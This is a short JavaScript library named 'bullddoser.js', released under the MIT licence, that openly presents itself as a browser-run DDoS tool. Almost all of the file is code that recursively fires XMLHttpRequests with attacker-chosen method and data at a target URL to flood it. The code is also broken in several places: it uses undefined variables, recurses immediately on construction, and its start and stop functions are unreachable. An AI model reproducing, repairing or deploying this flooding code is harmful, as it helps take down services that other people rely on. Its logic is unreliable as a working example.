/*!
bullddoser.js - v0.1.0
Created by Gonçalo Sá on 2015-08-17.

git://github.com/GNSPS/bullDDOSer.git

The MIT License (MIT)

Copyright (c) 2015 Gonçalo Sá

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. 
*/

(function universalModuleDefinition(root, factory) {
    "use strict";

    if(typeof exports === 'object' && typeof module === 'object') {
        // Node module exports
        module.exports = factory();
    }
    else if(typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define([], factory);
    }
    else if(typeof exports === 'object') {
        // CommonJS style that does not support module.exports
        exports['bullddoser'] = factory();
    }
    else {
        // Global
        root['bullddoser'] = factory();
    }
}(this, function () {
    "use strict";
    
    function Bull(method, target, data) {
        var bullfighterEnters = false;
        
        function Charge(method, target, data) {
            var http = new XMLHttpRequest(); 

            http.open(method, target, true); 

            http.onreadystatechange = this.bullfighterWins ? function(){} : new Charge(method, target, data);

            http.send((!data.length && method === "POST") ? null : data);
        }
        
        function start() {
            var bullfighterEnters = false;
            
            for(var i = 0; i < browserCap; i++) {
                new Charge(method, target, data);
            }
        }
        
        function stop() {
            var bullfighterEnters = true;
        }
    }
    
    Bull.browserCap = 6;
    
    return {
        create: function(method, target, data) {
            return new Bull(method, target, data);
        }
    };
}));